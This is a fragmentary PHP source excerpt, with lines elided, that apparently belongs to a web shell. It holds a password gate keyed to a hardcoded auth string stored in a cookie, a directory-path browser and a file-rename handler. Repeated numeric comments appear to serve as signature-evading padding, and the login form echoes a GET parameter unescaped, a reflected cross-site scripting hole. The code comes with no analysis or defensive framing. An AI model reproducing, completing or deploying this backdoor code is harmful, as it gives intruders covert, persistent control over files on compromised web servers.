...
$auth_key = "ce1a55dbe1ba56fc2d0d64a0876a0ef3";
...
$pass = false;
if (isset($_COOKIE['pw_name_48900'])) {
    if(($_COOKIE['pw_name_48900']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_48900'])) {
        if(($_POST['pw_name_48900']) == $auth_key) {
            setcookie("pw_name_48900", $_POST['pw_name_48900']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_48900' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1739267297984483 1739267297723211 1739267297297649 1739267297411907
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1739267297984483 1739267297723211 1739267297297649 1739267297411907
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1739267297984483 1739267297723211 1739267297297649 1739267297411907
            $name = PATH . "/" . $_GET['r'];
